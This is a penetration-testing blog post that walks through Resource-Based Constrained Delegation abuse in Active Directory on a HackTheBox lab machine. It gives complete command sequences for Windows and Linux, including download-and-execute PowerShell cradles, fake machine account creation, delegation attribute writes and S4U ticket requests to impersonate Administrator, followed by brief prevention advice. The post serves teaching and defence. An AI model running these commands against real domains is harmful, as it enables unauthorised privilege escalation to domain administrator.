---
title: Resource-Based Constrained Delegation (RBCD)
published: 2025-10-25
description: In this Post you'll learn everything you need to know about Resource-Based Constrained Delegation, from exploitation on Linux/Windows to how to Prevent it.
image: 'https://delorian.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F3550432212-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FgxTXO9Ixrx4ExK6jnMbc%252Fuploads%252FeNH7fh8aux3nJ75dkpDO%252Fimage.png%3Falt%3Dmedia%26token%3D9cd24f3b-0dd9-4376-a7b5-8dca7cfdeef6&width=768&dpr=1&quality=100&sign=da31eab4&sv=2'
tags: [Blog, Attack, Active Directory]
category: Blog
draft: false
---

# Resource-Based Constrained Delegation

*In many different environments, our Pentest team finds the same common active directory related vulnerabilities over and over again. Those can often be exploited for privilege escalation and or lateral movement. This blog post presents one of these well-known publicly documented attack techniques – namely **Resource Based Constrained Delegation (RBCD)***.
## 1. How Does it work?
### 1.1 **Understanding AD Delegation**

In **Active Directory**, delegation allows **impersonating other user accounts** on target computers after delegation permissions are granted. There are **three main types** of delegation:

1. **Unconstrained Delegation**
2. **Constrained Delegation**
3. **Resource-Based Constrained Delegation (RBCD)**

This explanation focuses on **RBCD attacks**.

### 1.2 **Constrained vs Resource-Based Delegation**

#### **Constrained Delegation:**

* Uses the **`msDS-AllowedToDelegateTo`** attribute
* Configured on the **source** object (the one being granted rights)
* Allows impersonation for **specific services**

### 1.3 Example: Checking constrained delegation

```powershell
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

#### **Resource-Based Constrained Delegation (RBCD):**

* Uses the **`msDS-AllowedToActOnBehalfOfOtherIdentity`** attribute
* Configured on the **target** object (the resource being accessed)
* **Computer-to-computer** delegation only

If you want to learn more about the attack, [Microsoft offers some documentation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview) about it

## 2. Scenario

In order to explain this attack, we will use the [Support](https://www.hackthebox.com/machines/support
) machine of ***HackTheBox***




### 2.1 Enumerating

The easiest way to enumerate RBCD misconfigurations is using **BloodHound**. Mark your current user as owned and perform the **"Shortest Paths from Owned Principles"** query.

::github{repo="SpecterOps/BloodHound"}


<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2Fyxfqm0qieV9xXw47hJxw%2Fimage.png?alt=media&#x26;token=8da120cd-982c-4fa1-8678-1e83d664bb9e" alt=""><figcaption></figcaption></figure>



In a *Resource-Based Constrained Delegation* scenario we will see that a user or group has *GenericAll / GenericWrite / Owns / WriteDacl* **ACL** over a computer

Any of these permissions can be developed onto the *Resource-Based Constrained Delegation* like in this case the group `SHARED SUPPORT ACCOUNTS` has *GenericAll* over the computer `DC.SUPPORT.HTB`

## 3. Exploitation from Windows

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FmNQTTBwJsZuiLZ1u8cIR%2Fimage.png?alt=media&#x26;token=5f6cbf6c-2533-4d02-bcc9-61901f101b17" alt=""><figcaption></figcaption></figure>

First we will need to download and import `PowerMad.ps1`

#### 3.1 Downloading toolset

> **PowerMad** is a **PowerShell toolkit** for Active Directory that enables **machine account creation and DNS record manipulation** using standard domain user privileges for `RBCD` attacks.

::github{repo="Kevin-Robertson/Powermad"}

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1')
Import-Module Powermad.ps1
```

And `PowerView.ps1`

> **PowerView** is a **PowerShell reconnaissance tool** for Active Directory that enables **permission enumeration, object querying, and attack path discovery** through extensive AD property and ACL analysis.

::github{repo="PowerShellMafia/PowerSploit"}

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
Import-Module PowerView.ps1
```

#### 3.2 Creating the Machine Account

Then create a fake machine account called **FAKE** with the following password: `Password123!` , make sure to not forget this password as you will need it in further exploitation

```powershell
New-MachineAccount -MachineAccount 'FAKE' -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force) -Verbose
```

To check if the new machine account was successfully created, let's try to check it using **PowerView**

```powershell
Get-DomainComputer FAKE
```

#### 3.3 Configuring RBCD

> Note: this part is done using powerview

After that, we need to get the *SID* of the fake computer we just created

```powershell
$ComputerSid = Get-DomainComputer 'FAKE' -Properties objectsid | Select -Expand objectsid
```

Then we create a *security descriptor*

```powershell
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

And finally let's apply *Resource-Based Constrained Delegation* to the target computer, don't forget to change the `$TARGET` to your target computer

```powershell
Get-DomainComputer '$TARGET' | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

Now let's see if there's success...

```powershell
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'
```

> It needs to show: msds-*allowedtoactonbehalfofotheridentity*

**What this does?**

* Modifies the **`msDS-AllowedToActOnBehalfOfOtherIdentity`** attribute
* Adds your fake computer's SID to the **security descriptor**
* Allows your fake computer to **impersonate users** on the target

#### Performing S4U Attack

> **S4U (Service-for-User)** is a **Kerberos extension** that allows a service to obtain tickets on behalf of users. It consists of **two components** that are often exploited for privilege escalation
>
> * S4U2Proxy (Service for User to Proxy)
> * S4U2Self (Service for User to Self)

In order to do this, let's download and import `Rubeus.exe`

* **Rubeus** is a **C# toolset for raw Kerberos interaction and abuse** that enables ticket extraction, *pass-the-ticket attacks*, *golden/silver ticket* creation, and **S4U** delegation exploitation in *Active Directory* environments.

First of all, we the *FAKE* computer with the password `Password123!`, so we need the hash of that password. Keep in mind that the `domain.com` shown on the command corresponds to the actual domain we are in

```powershell
.\Rubeus.exe hash /password:Password123! /user:FAKE$ /domain:domain.com
```

> **Output:** Provides **RC4, AES128, and AES256** hashes of the machine account password.

Now let's request the service ticket for the *CIFS* service. Again keep in mind that that the `target.com` shown is the target domain we want to attack and the *administrator* user is the user we want to impersonate

```powershell
.\Rubeus.exe s4u /user:FAKE$ /rc4:<RC4-HASH> /impersonateuser:administrator /msdsspn:cifs/target.com /domain:domain.com /ptt
```

> **Output**: Provides the tickets needed

From now, you successfully attacked **RBCD**, you can check the admin's ticket using klist

```c
klist
```

## 4. Exploitation from Linux

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2FwM71JlKyVXdIIbCKf5DS%2Fimage.png?alt=media&#x26;token=377b0e3f-6f70-48fd-82ae-f934ac2aa895" alt=""><figcaption></figcaption></figure>

#### 4.1 Download toolset

In order to continue with the exploitation, we need to install `impacket` if we don't have it installed on our attacker system

> **Impacket** is a **collection of Python classes and scripts for working with network protocols** that provides programmatic low-level access to protocols like SMB, MSRPC, Kerberos, and LDAP for penetration testing and red team operations.

::github{repo="fortra/impacket"}

#### 4.2 Create the Machine Account

First let's create an *Attacker-Controlled Machine Account* called `FAKE01$` with the following password: `Password123!`

```bash
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'Password123!' -dc-ip <IP> '<domain>/<User>:<Password>'
```

> **Output:** \[+] Successfully added machine account FAKE01$ with password Password123!\*

#### 4.3 Configuring RBCD

Now let's grant *RBCD* permissions to allow `FAKE01$` to delegate to `target$` successfully while target$ being the victim computer object we want to delegate to

```bash
impacket-rbcd -delegate-to '$target' -delegate-from 'FAKE01$' -dc-ip <ip> -action write '<domain>/<user>:<password>'
```

> **Output:** *\[+] Delegation rights modified successfully!*

#### 4.4 Request the Impersonation Ticket & Export it

To finish this let's request an *Impersonation Ticket*

```bash
impacket-getST -spn cifs/$target -impersonate Administrator -dc-ip <ip> '<domain>/FAKE01$:Password123!'
```

We're almost there, just export the *Kerberos Ticket*

```bash
export KRB5CCNAME=Administrator.ccache
```

From now, you successfully attacked **RBCD**, you can check the admin's ticket using klist

```c
klist
```

## 5. Conclusion

RBCD attacks reveal a critical truth in Active Directory security: **excessive permissions on computer objects can lead to complete domain compromise**. This isn't a complex exploit—it's abusing legitimate Kerberos features that become dangerous when combined with misconfigured trust.

The attack works because:

* **Default settings** allow any user to create computer accounts
* **Write permissions** on computer objects enable delegation configuration
* **Kerberos delegation** lets services impersonate users across systems

What makes RBCD particularly dangerous is its simplicity. With just a few commands, an attacker can escalate from basic domain user to domain administrator by weaponizing the very trust relationships designed to make AD functional.

### 5.2 **How to Prevent It:**

1. **Clean up permissions** regularly
2. **Monitor for new computer accounts**
3. **Use "cannot be delegated" for important admin accounts**
4. **Remember: in Active Directory, who you trust is more important than what you know**
